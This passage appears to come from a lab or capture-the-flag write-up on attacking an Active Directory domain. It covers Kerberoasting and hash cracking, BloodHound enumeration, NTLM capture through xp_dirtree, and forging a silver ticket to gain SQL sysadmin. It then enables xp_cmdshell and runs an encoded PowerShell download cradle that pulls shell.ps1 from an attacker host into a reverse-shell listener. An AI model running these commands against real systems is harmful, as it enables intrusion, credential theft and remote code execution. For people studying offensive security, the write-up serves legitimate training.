$krb5tgs$18$svc_krb_t2$WESTBRIDGE.HSM$*svc_krb_t2*$8ba406d3ea7659a21$d6adc1c$663121f7137e84bce12585ffe3b14796000e18a6e67cd6e7fbed858efb$2857ae04955f2eed393dbd2943786a521070d88fd126dcd3a1b0cc1f2ed18a1e1$8bc7a8f47b5d571dd995626cc40b603dba503a2b4d3f57cf6f734e1e7f6128c51$344a4525938c78110c27ce8c635516d096f28b5522d1a9758060d4e051f2c4dfa$2079...
```

Four hashes — and look at the names:

| Principal | Etype | Significance |
|---|---|---|
| **krbtgt** | 18 (AES256) | The domain's master key. Crack it ➜ golden tickets. |
| **svc_mssql** | 23 (RC4) | Fast-crack candidate |
| **svc_files** | 18 (AES256) | File server service account (SPN: `cifs/FILES.westbridge.hsm`) |
| **svc_krb_t2** | 18 (AES256) | "Tier 2 provisioning" — interesting |

Cracking `krbtgt`'s AES256 key offline would be a long shot, but RC4 is cheap to try:

```bash
➜ hashcat --identify /tmp/hash.txt
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol

➜ hashcat -a 0 -m 13100 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1

...[snip]...
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql$WESTBRIDGE.HSM$svc_mssql*$15...34a451
```

**Cracked:** `svc_mssql` : `sqls3rv3r` 🎉

## 7.3 Validating Access

```bash
➜ nxc smb 10.0.10.5 \
    -u svc_mssql -p 'sqls3rv3r'
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r

➜ nxc winrm 10.0.10.5 \
    -u svc_mssql -p 'sqls3rv3r'
WINRM       10.0.10.5       5985   DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm)
WINRM       10.0.10.5       5985   DC               [-] westbridge.hsm\svc_mssql:sqls3rv3r

➜ nxc smb 10.0.10.15 \
    -u svc_mssql -p 'sqls3rv3r'
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\svc_mssql:sqls3rv3r

➜ nxc winrm 10.0.10.15 \
    -u svc_mssql -p 'sqls3rv3r'
WINRM       10.0.10.15      5985   FILES            [*] Windows 11 / Server 2025 Build 26100 (name:FILES) (domain:westbridge.hsm)
WINRM       10.0.10.15      5985   FILES            [-] westbridge.hsm\svc_mssql:sqls3rv3r
```

Valid domain credential on **both** the DC and FILES over SMB (no WinRM — the account isn't in Remote Management Users). With authenticated access comes proper share enumeration:

```bash
➜ nxc smb files.westbridge.hsm \
    -u svc_mssql -p 'sqls3rv3r' \
    --shares
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\svc_mssql:sqls3rv3r
SMB         10.0.10.15      445    FILES            [*] Enumerated shares
SMB         10.0.10.15      445    FILES            Share           Permissions            Remark
SMB         10.0.10.15      445    FILES            -----           -----------            ------
SMB         10.0.10.15      445    FILES            ADMIN$                                 Remote Admin
SMB         10.0.10.15      445    FILES            C$                                     Default share
SMB         10.0.10.15      445    FILES            IPC$            READ                   Remote IPC
SMB         10.0.10.15      445    FILES            IT-Share                               IT Internal - Administrators Only
SMB         10.0.10.15      445    FILES            Scripts                                File Server Support members only
SMB         10.0.10.15      445    FILES            Students        READ                   Public student resources and academic documents
```

Readable access to **Students** on FILES, and two juicy-looking restricted shares (`IT-Share`, `Scripts`) waiting for better privileges.

# 8. Authenticated Enumeration — svc_mssql

## 8.1 Protocol Matrix

With a valid domain credential, every protocol gets re-tested — not just the one that cracked:

```bash
➜ for proto in smb ldap mssql winrm rdp; \
    do nxc $proto dc.westbridge.hsm -u 'svc_mssql' -p 'sqls3rv3r'; \
    echo '---';
done

SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
---
LDAP        10.0.10.5       389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm) (signing:None) (channel binding:When Supported)
LDAP        10.0.10.5       389    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
---
---
WINRM       10.0.10.5       5985   DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm)
WINRM       10.0.10.5       5985   DC               [-] westbridge.hsm\svc_mssql:sqls3rv3r
---
RDP         10.0.10.5       3389   DC               [*] Windows 10 or Windows Server 2016 Build 26100 (name:DC) (domain:westbridge.hsm) (nla:True)
RDP         10.0.10.5       3389   DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
```

SMB and LDAP are in — but the standout is **RDP `[+]`**: NLA accepted the logon, meaning `svc_mssql` is allowed interactive RDP sessions to the DC. That's a potential GUI foothold (`xfreerdp` / dynamic desktop) if we need one.

## 8.2 BloodHound Collection

With `svc_mssql`:`sqls3rv3r` in cleartext, the clean path is simple bind:

```bash
➜ rusthound-ce \
    -d westbridge.hsm -f dc.westbridge.hsm \
    -u 'svc_mssql' -p 'sqls3rv3r' \
    --zip -c All
```

# 9. BloodHound Intel — The Bigger Picture

## 9.1 A Second Forest

```
WESTBRIDGE.HSM  <->  WESTBRIDGE-RESEARCH.HSM
```

Bidirectional **forest trust**, SID filtering enabled. There's an entire research forest on the other side of the DC — and suddenly the account named `researchoperator` in our web dump doesn't look random anymore. Cross-forest attack surface is now in scope.

![BloodHound — cross-forest trust to WESTBRIDGE-RESEARCH.HSM](/assets/images/westbridge-bh-cross-forest-trust.png)

## 9.2 Hosts That Never Appeared on the Wire

Our scans found three hosts. BloodHound shows **five computer objects**:

| Computer | Seen in scans? |
|---|---|
| `DC$` | yes |
| `FILES$` | yes |
| `WEB$` | yes |
| **`SQL$`** | **no** — matches `svc_mssql`'s SPN `MSSQLSvc/SQL.westbridge.hsm:1433` |
| **`HELPDESK-WS$`** | **no** — a workstation, hidden from our subnet |

`SQL` and `HELPDESK-WS` are live objects the network scan never surfaced. DNS enumeration against the DC should resolve them.

![BloodHound — svc_mssql and the hidden SQL host](/assets/images/westbridge-bh-svc-mssql.png)
![BloodHound — svc_mssql SPN pointing at SQL.westbridge.hsm](/assets/images/westbridge-bh-svc-mssql-spn.png)

The SPN in the LDAP dump (`MSSQLSvc/SQL.westbridge.hsm:1433`) already told us a machine named `sql` existed — DNS just confirmed its address. The same brute also popped a second hidden host we'd never have guessed:

```bash
➜ for h in sql db mssql helpdesk-ws helpdesk hr dev mail fs nas vpn; do
    ip=$(dig +short @10.0.10.5 $h.westbridge.hsm A); [ -n "$ip" ] && echo "$h -> $ip";
  done
sql -> 10.0.10.20
helpdesk-ws -> 10.0.10.25
```

Updating our hosts file so Kerberos/SMB tooling resolves both correctly later:

```bash
10.0.10.20    SQL.westbridge.hsm SQL
10.0.10.25    HELPDESK-WS.westbridge.hsm HELPDESK-WS   # parked for later — unscanned
```

## 9.3 Delegation

`svc_files` (SPN: `cifs/FILES.westbridge.hsm`) has **AllowedToDelegate ➜ `FILES$`** — constrained delegation to the file server itself. Once we own `svc_files`, that's an S4U path to act as *any* user against the FILES service.

![BloodHound — svc_files AllowedToDelegate to FILES / FILES.WESTBRIDGE.HSM](/assets/images/westbridge-bh-svcfiles-delegate.png)

## 9.4 Non-Default ACL Edges

Filtering out the default domain noise, four edges look *placed*:

|| Principal | Edge | Target |
|---|---|---|
|| **`svc_webmonitor`** | **AddKeyCredentialLink** | **`svc_files`** |
|| `m.thompson` | GenericAll | `STUDENTS` group + ~a dozen student accounts |
|| `svc_krb_t2` | GenericAll | `IT TIER2` group |
|| unknown RID `-9510` | GenericAll | `IT TIER3` group |

![BloodHound — svc_webmonitor outbound: AddKeyCredentialLink on svc_files](/assets/images/westbridge-bh-svcwebmonitor-addkeycred.png)

![BloodHound — m.thompson GenericAll over the STUDENTS OU](/assets/images/westbridge-bh-mthompson-genericall-students.png)

![BloodHound — svc_krb_t2 GenericAll over IT TIER2](/assets/images/westbridge-bh-svckrbt2-genericall-tier2.png)

![BloodHound — RID 9510 GenericAll over IT TIER3 (anomaly — unnamed at this point)](/assets/images/westbridge-bh-9510-genericall-it-tier3.png)

The first one is the headline: **`svc_webmonitor` can drop a Shadow Credential on `svc_files`** — a key-trust attack (`pywhisker`) that yields `svc_files`'s identity without ever touching its password. And remember: `svc_files` has constrained delegation to `FILES$`. That's a two-hop chain: *own svc_webmonitor ➜ shadow-cred svc_files ➜ S4U to FILES$*.

Also interesting: **RID 9510** holds GenericAll over IT TIER3 but never appeared in our 38-user web dump. An account the directory app doesn't show — worth an LDAP lookup now that we have authenticated access. At this point it's just an anomaly: a hidden account with total control over the privileged tier. It gets named later.

## 9.5 Group Map

The web dump labelled `m.thompson`, `c.wilson`, `s.adams` as "Member of Administrators" — but that's the People Directory's *own* app-level role, not AD. Cross-referencing BloodHound, none of them sit in `Domain Admins`; their real group memberships are below. (m.thompson's actual standing — IT Tier1 + MSSQL Maintenance + Student Account Administrators — is what drives the OU abuse in [Section 12.1](#121-the-mthompson-picture).)

| Account | AD Groups (from BloodHound) |
|---|---|
| `m.thompson` | IT Tier1 Support · MSSQL Maintenance · Student Account Administrators |
| `s.adams`, `c.wilson` | Account Policy Administrators |
| `j.walsh` | MSSQL Maintenance (co-sysadmin on SQL, see [Section 10.4](#the-prize-westbridgemssql-maintenance)) |
| `svc_webmonitor` | **File Server Administration** 🡐 owns the shadow-cred edge |
| `svc_web` | Web Backup Maintainers |
| `svc_files` | File Server Service Accounts |
| `svc_krb_t2` | Tier 2 Provisioning Services |
| `researchoperator` | standalone — likely cross-forest |

# 10. Pivot — The Hidden SQL Host

## 10.1 Discovery & First Contact

The SPN on `svc_mssql` (`MSSQLSvc/SQL.westbridge.hsm:1433`) named a machine our port scans never saw. The DC's DNS confirmed it:

```bash
➜ dig +short @10.0.10.5 sql.westbridge.hsm A
10.0.10.20
```

```bash
PORT     STATE SERVICE       REASON  VERSION
1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.0.10.20:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
...
| ms-sql-ntlm-info:
|   10.0.10.20:1433:
|     Target_Name: WESTBRIDGE
|     NetBIOS_Domain_Name: WESTBRIDGE
|     NetBIOS_Computer_Name: SQL
|     DNS_Domain_Name: westbridge.hsm
|     DNS_Computer_Name: SQL.westbridge.hsm
|     DNS_Tree_Name: westbridge.hsm
|_    Product_Version: 10.0.26100
3389/tcp open  ms-wbt-server syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=SQL.westbridge.hsm
| Issuer: commonName=SQL.westbridge.hsm
...
```

Quick probe: ICMP drops, but **1433 (MSSQL)** and **3389 (RDP)** answer:

```bash
➜ nxc mssql sql.westbridge.hsm \
    -u 'svc_mssql' -p 'sqls3rv3r'
MSSQL       10.0.10.20      1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (2019 RTM 15.0.2000) (name:SQL) (domain:westbridge.hsm) (EncryptionReq:False)
MSSQL       10.0.10.20      1433   SQL              [+] westbridge.hsm\svc_mssql:sqls3rv3r
```

Same cracked credential, brand-new hidden host.

## 10.2 Mapping the Instance

With the cracked `svc_mssql:sqls3rv3r` credential, connect to the instance over Windows auth (the SQL box is domain-joined, so the domain account logs in directly):

```bash
➜ mssqlclient.py \
    westbridge.hsm/svc_mssql:'sqls3rv3r'@10.0.10.20 \
    -windows-auth
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (WESTBRIDGE\svc_mssql  guest@master)>
```

Before touching anything, baseline what this login *is* and *isn't* — query by query.

First, what version and OS are we on?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT @@VERSION;
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2025 Datacenter 10.0 <X64> (Build 26100: ) (Hypervisor)
```

SQL Server 2019 **Express** on Windows Server 2025. Express is the limited/free edition, but it still runs as a Windows **service account** — and that's the part we care about: whatever we coerce later executes as `svc_mssql`, not SYSTEM. The OS line is just context.

Next, who are we, and do we hold the `sysadmin` fixed-server role?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-   -
0   0
```

`SYSTEM_USER` is `WESTBRIDGE\svc_mssql` (our login); `IS_SRVROLEMEMBER('sysadmin')` returns `0` — **we are not a SQL sysadmin**. That single fact is the entire reason [Section 10.5](#step-3--forge-the-ticket) exists: with no sysadmin role we can't `xp_cmdshell` onto the box, so we forge a silver ticket that *claims* the sysadmin group instead. (It also means the `MSSQL Maintenance` membership we find in [Section 10.4](#the-prize-westbridgemssql-maintenance) is the only path to sysadmin — and it lives in the directory, not in this SQL login.)

What databases are visible?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT name FROM sys.databases;
name
----------
master
tempdb
model
msdb
Westbridge
```

The usual system DBs plus a custom **`Westbridge`** database — the app's data store and the obvious loot. We can *see* it listed but can't open it yet.

And what can this login actually do at the server level?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT * FROM fn_my_permissions(NULL,'SERVER');
entity_name   subentity_name   permission_name
-----------   --------------   -------------------
server                         CONNECT SQL
server                         VIEW ANY DATABASE
server                         VIEW ANY DEFINITION
```

The honest ceiling: only `CONNECT SQL`, `VIEW ANY DATABASE`, and `VIEW ANY DEFINITION`. Read-only enumeration rights — no `IMPERSONATE ANY LOGIN`, no `ALTER ANY LOGIN`, no `CONTROL SERVER`. That rules out the easy SQL privesc routes (IMPERSONATE a sysadmin login, or self-grant the role), which is why the restore-and-read path in [Section 10.7](#107-the-backup--westbridgebak) is the play, not an in-SQL escalation.

That's the ceiling for this login: **not** a SQL sysadmin, the `Westbridge` DB is visible in the catalog but locked to `svc_mssql`, and the server-level rights are read-only (`CONNECT SQL` / `VIEW ANY DATABASE` / `VIEW ANY DEFINITION` only). The next questions are whether the *service* account fares any better, and who in AD actually holds `sysadmin` — which is exactly what [Section 10.3](#103-coercion-check--who-does-the-service-run-as) and [Section 10.4](#the-prize-westbridgemssql-maintenance) check.

## 10.3 Coercion Check — Who Does the Service Run As?

Even without sysadmin, the classic `xp_dirtree` UNC trick tests what the MSSQL *service* authenticates as. Firing it at our Responder:

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> EXEC master.sys.xp_dirtree '\\192.168.211.2\capture',1,1
```

The query hangs — `xp_dirtree` makes the *service* (not our login) reach out over SMB to the UNC path, so it blocks waiting on a callback. Responder caught it:

```bash
[SMB] NTLMv2-SSP Client   : 10.0.10.20
[SMB] NTLMv2-SSP Username : WESTBRIDGE\svc_mssql
[SMB] NTLMv2-SSP Hash     : svc_mssql::WESTBRIDGE:7bca4a5d8e4250f5:860C49449E87209D4C4690AB84E922A7:01010000000000008000D4423437DD015E326CA9C877E7E60000000002000800420059003500310001001E00570049004E002D005000590037004A00310048004B00310046005A00510004003400570049004E002D005000590037004A00310048004B00310046005A0051002E0042005900350031002E004C004F00430041004C000300140042005900350031002E004C004F00430041004C000500140042005900350031002E004C004F00430041004C00070008008000D4423437DD010600040002000000080050005000000000000000000000000030000029F49D9768AEA3C9EA4F84C3864A2E69B899284AA2040A0C2D64CCECBDA1508A5EF7596AADF850CBC5C5FB8A046D73F9ADD6FB436459C6C3170D8AD43C843E130A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200310031002E0032000000000000000000
```

**The service runs as the domain account we already own** — `WESTBRIDGE\svc_mssql`, no new hash to crack. But two facts got locked in: the coercion primitive works, and any future code execution on this box runs as `svc_mssql`. Relay check came back negative (DC/FILES enforce signing, SQL has no 445 reachable) — so this is parked until a signing-exempt target appears.

## 10.4 The Prize — WESTBRIDGE\MSSQL Maintenance

Who actually *is* sysadmin here? Enumerate the `sysadmin` **fixed-server role** by joining the role principals to their members (`sys.server_role_members`):

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';
role       member
--------   ----------------------------
sysadmin   sa
sysadmin   NT SERVICE\SQLWriter
sysadmin   NT SERVICE\Winmgmt
sysadmin   NT Service\MSSQLSERVER
sysadmin   WESTBRIDGE\MSSQL Maintenance
```

Four of the five rows are *built-in* sysadmins — `sa` (the SQL superuser), and the three `NT SERVICE*` engine SIDs (SQL Writer, WMI, and the SQL Server service itself). They're noise for us: `sa` is locked down and the service SIDs aren't credentially reachable.

The fifth row is the one that matters, and the reason this block is headed "The Prize":

```sql
sysadmin   WESTBRIDGE\MSSQL Maintenance
```

`WESTBRIDGE\MSSQL Maintenance` is a **domain group**, not a local SQL principal. SQL Server's highest privilege is held by a directory object we can touch from outside the instance.

That's the whole shift: in [Section 10.2](#102-mapping-the-instance) we established our own login (`svc_mssql`) is *not* sysadmin and can't grant itself the role. But here we learn sysadmin is conferred through group membership — and group membership is decided in AD, not inside SQL. So there are now two ways to become sysadmin: **own a member of `WESTBRIDGE\MSSQL Maintenance`** (a human password), **or forge a token that already claims the group** (the silver ticket in [Section 10.5](#step-3--forge-the-ticket) — which is exactly why `-groups 9497` there targets this group's RID). The humans are the *obvious* path; the forged-group path is the *shortcut* that skips them.

Cross-referencing BloodHound:

| Member | Elsewhere |
|---|---|
| **m.thompson** | flagged "Administrator" by the People Directory (app-role, **not** AD Domain Admins), IT Tier1 Support |
| **j.walsh** | plain user |

Own either identity ➜ sysadmin ➜ `enable xp_cmdshell` ➜ code execution on SQL as `svc_mssql`. The impersonation shortcuts are all closed (no IMPERSONATE grants, no ALTER ANY LOGIN for us), so the path runs through one of those two humans.

**Leads toward them:** RDP is open on SQL (NLA accepts svc_mssql) — a maintenance group implies maintenance logons worth waiting for on an interactive session; the Flask app's DB connection string lives somewhere on WEB; and `HELPDESK-WS` (10.0.10.25) is now resolvable.

One more graph detail worth flagging from this collection: BloodHound's `SQLAdmin` edge runs from the **`WESTBRIDGE\MSSQL Maintenance`** group (m.thompson, j.walsh) toward `SQL.WESTBRIDGE.HSM` — its way of recording that those identities hold the SQL instance's `sysadmin` fixed-server role, i.e. "these accounts can administer the SQL box." That's the same fact the `sys.server_role_members` query surfaced above, now visualized: it's *why* owning either human meant owning the box, and it's what put the hidden SQL host on our map as a target worth pivoting to.

![BloodHound — MSSQL Maintenance SQLAdmin edge to the hidden SQL host](/assets/images/westbridge-bh-svcmssql-sqladmin.png)

## 10.5 Silver Ticket — Skipping the Humans Entirely

Why chase `j.walsh`'s password when we already own the service account whose secret encrypts every TGS for `MSSQLSvc/SQL.westbridge.hsm:1433`? The silver ticket needs no KDC contact, no IMPERSONATE grants, nothing — just three core ingredients (the domain SID, the service-account RC4 key, and the SPN) that become five `ticketer` flags once you add the injected `MSSQL Maintenance` group RID and a cosmetic user RID.

### Step 1 — Domain SID

The domain SID is the authority the forged ticket carries into the environment; without it the ticket is just an SPN-bound blob with no place to land.

```bash
➜ nxc ldap dc.westbridge.hsm \
    -u 'svc_mssql' -p 'sqls3rv3r' \
    --get-sid
LDAP        10.0.10.5       389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm) (signing:None) (channel binding:When Supported)
LDAP        10.0.10.5       389    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
LDAP        10.0.10.5       389    DC               Domain SID S-1-5-21-1978613116-3728955385-531918137
```

### Step 2 — Plaintext to NT hash

We cracked `svc_mssql`'s password (`sqls3rv3r`) earlier, so we already hold its plaintext — convert it to the RC4 NT key that actually signs the ticket.

```bash
➜ pypykatz crypto nt 'sqls3rv3r'
025d7fd412286bef880ba432685d6d8f
```

### Step 3 — Forge the ticket

Now build the silver ticket: sign it with the service-account RC4 key, bind it to the SQL SPN (`MSSQLSvc/SQL.westbridge.hsm:1433`, the one BloodHound records on `svc_mssql`), and stamp the PAC with the domain SID, the MSSQL Maintenance group RID, and our user RID so SQL Server reads a sysadmin token on connect.

The five `ticketer` flags each carry one piece of the forgery:

* **`-nthash`** — `svc_mssql`'s RC4 key. We sign the ticket with it, which is what makes the forgery valid: to SQL, the ticket *is* `svc_mssql`, because only `svc_mssql`'s key could have produced it.
* **`-domain-sid`** — the authority the ticket claims membership in. Without it the PAC has no forest to belong to.
* **`-spn`** — `MSSQLSvc/SQL.westbridge.hsm:1433`. The service the ticket unlocks. This is what makes it a *silver* ticket (service-bound) rather than a TGT.
* **`-groups 9497`** — the payload. `9497` is the RID of `WESTBRIDGE\MSSQL Maintenance`, the **domain group** that holds SQL Server's `sysadmin` fixed-server role (we confirmed that membership back in [Section 10.4](#the-prize-westbridgemssql-maintenance)). By writing that RID into the PAC's group list, we make SQL read our token as a `sysadmin` on connect — *that* is the privilege, not the user identity. We never needed `m.thompson`'s or `j.walsh`'s password; we simply authored a token that already belongs to the right group.
* **`-user-id 9459`** — the RID stamped in for "our" forged user. It's arbitrary: it only has to be unique and plausible. The power lives in the *group* RID, so the user RID is cosmetic.

```bash
➜ ticketer.py -nthash 025D7FD412286BEF880BA432685D6D8F \
    -domain-sid S-1-5-21-1978613116-3728955385-531918137 \
    -domain westbridge.hsm \
    -spn MSSQLSvc/SQL.westbridge.hsm:1433 \
    -groups 9497 \
    -user-id 9459 \
    svc_mssql
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for westbridge.hsm/svc_mssql
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving/Updating ticket in svc_mssql.ccache
```

(`svc_mssql` accepted the RC4-signed forgery — consistent with an RC4-only `msDS-SupportedEncryptionTypes`, since the silver ticket is sealed with its NT hash.)

![BloodHound — svc_mssql's registered SPN: MSSQLSvc/SQL.westbridge.hsm:1433](/assets/images/westbridge-bh-svc-mssql-spn.png)

> **Cross-check — which SPN string?** The SPN we forged against, `MSSQLSvc/SQL.westbridge.hsm:1433`, is the one BloodHound records on `svc_mssql` (above) — it's what the directory *thinks* the SQL service is registered as. But `klist` on the resulting ticket shows `sql_mssql/SQL.westbridge.hsm@WESTBRIDGE.HSM`, the SPN the SQL Server actually registered in AD. Both resolve to the same account, and that's the whole point of a silver ticket: **the SQL service never asks a KDC whether the SPN string is canonical** — it just decrypts the ticket with its own account's key. As long as it's sealed with `svc_mssql`'s RC4 key (any SPN registered to that account, or even one that isn't), SQL Server accepts it and reads group memberships from the PAC we wrote. That's also why silver tickets are KDC-invisible: no 4769 event ever exists for them.

```bash
➜ klist svc_mssql.ccache
Ticket cache: FILE:svc_mssql.ccache
Default principal: svc_mssql@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 02:15:47  08/20/2036 02:15:47  sql_mssql/SQL.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/20/2036 02:15:47
```

Connect and prove the group injection landed:

```bash
# Kerberos tooling (-k) reads /etc/krb5.conf to locate the realm's KDC,
# so generate it before any -k call.
➜ nxc smb dc.westbridge.hsm --generate-krb5-file /tmp/krb5.conf
➜ sudo cp /tmp/krb5.conf /etc/krb5.conf

# The ccache here is the forged silver ticket, not the original TGT
➜ env KRB5CCNAME=svc_mssql.ccache \
mssqlclient.py \
    'westbridge.hsm/svc_mssql@sql.westbridge.hsm' -k -no-pass
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (WESTBRIDGE\svc_mssql  dbo@master)>      # dbo everywhere = sysadmin token
```

## 10.6 SYSTEM on SQL

We hold a `sysadmin` token purely because of the group RID we forged into the PAC in [Section 10.5](#step-3--forge-the-ticket) — but `xp_cmdshell` is *disabled by default*, so the first move is to switch it on. That `enable_xp_cmdshell` call is itself the proof the forgery landed: flipping `show advanced options` / `xp_cmdshell` to `1` requires the `sysadmin` fixed-server role, which is exactly the right the silver ticket's injected `WESTBRIDGE\MSSQL Maintenance` membership grants.

First, start the listener that the shell will call back to:

```bash
➜ rlwrap -cAr ncat -lnvp 9294
```

With the forged sysadmin token, walk the `xp_cmdshell` enablement step by step. First, confirm the injected role actually took — `IS_SRVROLEMEMBER('sysadmin')` should now return `1`:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');

-
1
```

`1` — the silver ticket's injected `WESTBRIDGE\MSSQL Maintenance` membership is being read as `sysadmin`. The forgery landed.

Now turn the advanced-options switch on. `sp_configure 'show advanced options', 1` stages the change; `RECONFIGURE` applies it:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(SQL): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (WESTBRIDGE\svc_mssql  dbo@master)> RECONFIGURE;
```

Then enable `xp_cmdshell` itself, same two-step pattern:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(SQL): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (WESTBRIDGE\svc_mssql  dbo@master)> RECONFIGURE;
```

Verify it's live by reading the in-use value straight from `sys.configurations`:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
value_in_use
------------
           1
```

`1` confirms `xp_cmdshell` is enabled. Run it — `whoami` tells us *which Windows identity* the shell will execute as:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC xp_cmdshell 'whoami';
output
--------------------
westbridge\svc_mssql
NULL

SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC xp_cmdshell 'hostname';
output
------
SQL
NULL
```

`xp_cmdshell` executes under the **SQL Server service account**, so the reverse shell comes back as `westbridge\svc_mssql` — *not* the `m.thompson`/`j.walsh` logins we never had. The silver ticket bought us the SQL `sysadmin` right; it did nothing for Windows logon, so we're still the service identity until we escalate.

Fire the download-cradle — the base64 is a PowerShell one-liner pulling `shell.ps1` from the attacker box (same pattern used throughout):

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> xp_cmdshell "powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADEAMQAuADIALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA"
```

And escalate we can, because service-account contexts carry the eternal gift: **SeImpersonatePrivilege**.

```bash
PS > whoami; hostname
westbridge\svc_mssql
SQL

PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` (Enabled) is the classic Windows-service escalation primitive. Any process running as a service that can impersonate clients can be tricked into impersonating a privileged one — that's the entire "Potato" family (`Rotten`, `Juicy`, `God`…), all of which abuse it via a named-pipe / DCOM / Print-Spooler coercion. **CrystalPotato** is the flavour we drop here: it coerces an authenticated connection from the SYSTEM security context and catches it with the impersonation privilege, netting us a second shell as `NT AUTHORITY\SYSTEM`.

### CrystalPotato

